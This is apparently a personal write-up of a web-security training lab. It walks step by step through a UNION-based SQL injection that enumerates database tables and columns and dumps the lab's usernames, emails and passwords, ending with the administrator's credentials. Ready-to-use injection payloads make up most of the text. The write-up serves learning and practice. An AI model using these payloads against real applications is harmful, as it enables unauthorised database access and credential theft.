# Lab: SQL injection attack, listing the database contents on non-Oracle databases

Target : You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

Analysis:
1- determine the number of columns
    - number of columns is 2 since `/filter?category=Gifts'+order+by+3+--` returns 500 error
2 - find a column u coulld use
    - the second column with is compatible with string values `Gifts'+UNION+SELECT+NULL,+'A'+--`
3- find intersting tables
    - `'+UNION+SELECT+NULL,table_name+from+INFORMATION_SCHEMA.TABLES++--` -> pg_user , users_uuzdph
4- find intersting columns within intersting tables
    - `Gifts'+UNION+SELECT+NULL,column_name+from+INFORMATION_SCHEMA.COLUMNS++--` -> passwd,username_phzayx
    - `'+UNION+SELECT+NULL,column_name+from+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name+='users_uuzdph'++--` ->  username_phzayx , email , password_vqobvy
5- extarct infos
    - `'+UNION+SELECT+NULL,CONCAT(username_phzayx,'~',email,'~',password_vqobvy)+from+users_uuzdph++--`

wiener~~ocvwmdexgjslulv731p6
administrator~~uywd9lgyq7232u142vrj
carlos~~fuo0lh9bkr4gvjzu0gqc
